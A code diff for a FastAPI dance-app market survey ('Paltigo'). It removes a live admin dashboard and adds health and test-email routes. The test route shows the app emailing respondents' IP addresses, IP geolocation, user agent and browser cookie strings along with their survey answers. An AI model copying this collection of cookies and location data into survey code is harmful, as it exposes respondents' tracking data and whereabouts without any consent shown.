-    let items = [];
-
-    const LABELS = {
-        "under_16": "Under 16", "16_18": "16–18", "19_22": "19–22",
-        "23_26": "23–26", "27_30": "27–30", "31_40": "31–40", "over_40": "Over 40",
-        "beginner_low": "Beginner · 1-2×/wk",
-        "beginner_high": "Beginner · 3+×/wk",
-        "intermediate_low": "Intermediate · 1-2×/wk",
-        "intermediate_high": "Intermediate · 3+×/wk",
-        "advanced_low": "Advanced · 1-2×/wk",
-        "advanced_high": "Advanced · 3+×/wk",
-        "douyin": "Douyin", "bilibili": "Bilibili", "studio": "Studio class",
-        "friend": "From a friend", "youtube": "YouTube",
-        "not_sure_correct": "Doesn't know if doing correctly",
-        "dont_see_myself": "Can't see herself clearly",
-        "dont_know_mistakes": "Doesn't know where mistakes are",
-        "no_feedback": "No feedback from anyone",
-        "too_fast": "Moves are too fast",
-        "no_time": "No time",
-        "other": "Other",
-        "yes_douyin": "Yes – Douyin/Xiaohongshu",
-        "yes_other": "Yes – other platforms",
-        "sometimes": "Sometimes",
-        "no": "No",
-        "0": "Nothing", "under100": "Under ¥100",
-        "100-300": "¥100–300", "300-500": "¥300–500",
-        "500-1000": "¥500–1,000", "over1000": "Over ¥1,000",
-        "yes_too_complex": "Tried – too complex",
-        "yes_too_expensive": "Tried – too expensive",
-        "yes_not_accurate": "Tried – not accurate",
-        "yes_english": "Tried – only in English",
-        "no_want": "Never tried, but wants to",
-        "no_never": "Never tried",
-        "accurate_scoring": "Accurate scoring",
-        "show_mistakes": "Show mistakes",
-        "compare_reference": "Compare with reference",
-        "multi_angle": "Multi-angle recording",
-        "progress_tracking": "Progress tracking",
-        "social_share": "Share on social media",
-        "tutorials": "Tutorials",
-        "free": "Free only",
-        "10-30": "¥10–30", "30-50": "¥30–50",
-        "50-100": "¥50–100", "100-200": "¥100–200",
-        "over200": "Over ¥200",
-        "instant_feedback": "Instant feedback",
-        "compare_friends": "Compare with friends",
-        "daily_challenges": "Daily challenges",
-        "new_content": "New content",
-        "community": "Community",
-    };
-
-    function label(v) {
-        if (v === null || v === undefined || v === "") return "—";
-        return LABELS[v] || v;
-    }
-
-    function connectWS() {
-        const proto = location.protocol === 'https:' ? 'wss' : 'ws';
-        const ws = new WebSocket(`${proto}://${location.host}/ws/live`);
-        ws.onopen = () => {
-            document.getElementById('wsDot').classList.add('online');
-            document.getElementById('wsLabel').textContent = 'live';
-        };
-        ws.onclose = () => {
-            document.getElementById('wsDot').classList.remove('online');
-            document.getElementById('wsLabel').textContent = 'reconnecting…';
-            setTimeout(connectWS, 2000);
-        };
-        ws.onerror = () => ws.close();
-        ws.onmessage = (ev) => {
-            try {
-                const item = JSON.parse(ev.data);
-                items.unshift(item);
-                render(true);
-                refreshCount();
-            } catch (e) {}
-        };
-    }
-
-    function escapeHtml(s) {
-        return String(s ?? '').replace(/[&<>"']/g, c => ({
-            '&':'&amp;', '<':'&lt;', '>':'&gt;', '"':'&quot;', "'":'&#39;'
-        }[c]));
-    }
-
-    function fmtTime(iso) {
-        if (!iso) return '—';
-        try { return new Date(iso).toLocaleString(); } catch { return iso; }
-    }
-
-    function answerRow(labelText, value, isStar = false) {
-        const isEmpty = value === null || value === undefined || value === "" ||
-                        (Array.isArray(value) && value.length === 0);
-        const cls = `answer-row${isStar ? ' star' : ''}`;
-
-        if (Array.isArray(value) && value.length > 0) {
-            const chips = value.map(v =>
-                `<span class="feature-chip">${escapeHtml(label(v))}</span>`
-            ).join('');
-            return `
-                <div class="${cls}">
-                    <div class="answer-label">${escapeHtml(labelText)}</div>
-                    <div class="feature-chips">${chips}</div>
-                </div>`;
-        }
-
-        const valCls = `answer-value${isEmpty ? ' empty' : ''}`;
-        const display = escapeHtml(label(value));
-        return `
-            <div class="${cls}">
-                <div class="answer-label">${escapeHtml(labelText)}</div>
-                <div class="${valCls}">${display}</div>
-            </div>`;
-    }
-
-    function render(flashFirst = false) {
-        if (!items.length) {
-            list.innerHTML = `<div class="empty"><i class="bi bi-inbox"></i>Waiting for the first survey submission…</div>`;
-            return;
-        }
-        list.innerHTML = items.map((n, idx) => {
-            const a = n.answers || {};
-            const flash = (flashFirst && idx === 0) ? 'flash' : '';
-            const dream = (a.dream_app || '').trim();
-
-            const dreamHtml = `
-                <div class="dream-section">
-                    <div class="dream-label"><i class="bi bi-stars"></i> Dream dance app</div>
-                    <div class="dream-box ${dream ? '' : 'empty'}">${dream ? escapeHtml(dream) : '— no answer —'}</div>
-                </div>`;
-
-            return `
-                <div class="notif-card ${flash}">
-                    <div class="notif-header">
-                        <div class="notif-id">#${n.id}</div>
-                        <div class="notif-meta-top">
-                            <span class="ip-chip"><i class="bi bi-wifi"></i> ${escapeHtml(n.ip || '—')}</span>
-                            <span class="ip-chip">${escapeHtml(n.language || '—')}</span>
-                            <span class="notif-time">${fmtTime(n.created_at)}</span>
-                        </div>
-                    </div>
-
-                    <div class="answer-grid">
-                        ${answerRow("Age", a.age)}
-                        ${answerRow("Experience & practice", a.q1)}
-                        ${answerRow("Learned last dance via", a.q2)}
-                        ${answerRow("Biggest challenge", a.q3, true)}
-                        ${answerRow("Posts videos", a.q5)}
-                        ${answerRow("Monthly spending", a.q6, true)}
-                        ${answerRow("Prior tools experience", a.q7)}
-                        ${answerRow("Wanted features", a.q8)}
-                        ${answerRow("Price willingness", a.q9, true)}
-                        ${answerRow("Retention driver", a.q10)}
-                    </div>
-
-                    ${dreamHtml}
-                </div>`;
-        }).join('');
-    }
-
-    async function loadInitial() {
-        try {
-            const r = await fetch('/api/survey/list');
-            const j = await r.json();
-            items = j.submissions || [];
-            render(false);
-            refreshCount();
-        } catch (e) { console.error(e); }
-    }
-
-    async function refreshCount() {
-        try {
-            const r = await fetch('/api/survey/count');
-            const j = await r.json();
-            document.getElementById('statTotal').textContent = j.total;
-            document.getElementById('statMax').textContent = j.max;
-        } catch {}
-    }
-
-    async function clearAll() {
-        if (!confirm('Clear all submissions from RAM? This cannot be undone.')) return;
-        await fetch('/api/survey/clear', { method: 'POST' });
-        items = [];
-        render();
-        refreshCount();
-    }
-
-    connectWS();
-    loadInitial();
-    setInterval(refreshCount, 15000);
-</script>
-</body>
-</html>
-"""
+    log(f"✅ Submission handled successfully from {ip}")
+    log("=" * 60)
+    return JSONResponse(status_code=200, content={"ok": True, "received_at": now})
 
 
-# =====================================================================
-# ROUTES — serve the embedded HTML
-# =====================================================================
 @app.get("/", response_class=HTMLResponse)
 def index():
     return HTMLResponse(SURVEY_HTML)
 
 
-@app.get("/dashboard", response_class=HTMLResponse)
-def dashboard():
-    return HTMLResponse(DASHBOARD_HTML)
+@app.get("/api/health")
+def health():
+    return {"ok": True, "time": datetime.utcnow().isoformat() + "Z"}
+
+
+@app.get("/api/test-email")
+def test_email():
+    """Open /api/test-email in the browser to verify SMTP works."""
+    log("🧪 TEST EMAIL triggered from browser")
+
+    fake_answers = {
+        "age": "19_22",
+        "q1": "intermediate_high",
+        "q2": "douyin",
+        "q3": "not_sure_correct",
+        "q5": "yes_douyin",
+        "q6": "300-500",
+        "q7": "yes_too_complex",
+        "q8": ["show_mistakes", "progress_tracking"],
+        "q9": "50-100",
+        "q10": "progress_tracking",
+        "dream_app": "This is a TEST submission — if you see this, "
+                     "SMTP is working correctly! 🎉",
+    }
+    now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
+    subject = "🧪 Paltigo Survey — TEST EMAIL"
+
+    geo = _geolocate_ip("8.8.8.8")  # Google DNS for demo
+
+    html = _build_email_html(fake_answers, "127.0.0.1", "en",
+                             "test-browser", "0x0", now,
+                             geo=geo,
+                             cookies="demo_cookie=abc123; _ga=GA1.2.xyz")
+    text = _build_email_text(fake_answers, "127.0.0.1", "en", now,
+                             geo=geo,
+                             cookies="demo_cookie=abc123; _ga=GA1.2.xyz")
+
+    success = _send_email(subject, html, text)
+
+    if success:
+        return JSONResponse(content={
+            "ok": True,
+            "message": f"✅ Test email sent to {RECIPIENT_EMAIL}",
+            "hint": "Check your inbox in a few seconds.",
+        })
+    else:
+        return JSONResponse(status_code=500, content={
+            "ok": False,
+            "message": "❌ Failed to send test email",
+            "hint": "Check the server terminal for detailed error logs.",
+        })
 
 
 # =====================================================================
-# ENTRY
+# Local dev entry point (Vercel ignores this)
 # =====================================================================
 if __name__ == "__main__":
     import uvicorn
     print("=" * 60)
-    print("  Paltigo Survey — All-in-one")
-    print(f"  Survey    : http://{HOST}:{PORT}/")
-    print(f"  Dashboard : http://{HOST}:{PORT}/dashboard")
-    print(f"  RAM max   : {MAX_SUBMISSIONS} submissions")
+    print("  Paltigo Survey — local dev")
+    print("  http://localhost:8080/")
+    print("  http://localhost:8080/api/test-email  ← test SMTP")
     print("=" * 60)
-    uvicorn.run(app, host=HOST, port=PORT)
+    uvicorn.run(app, host="0.0.0.0", port=8080)
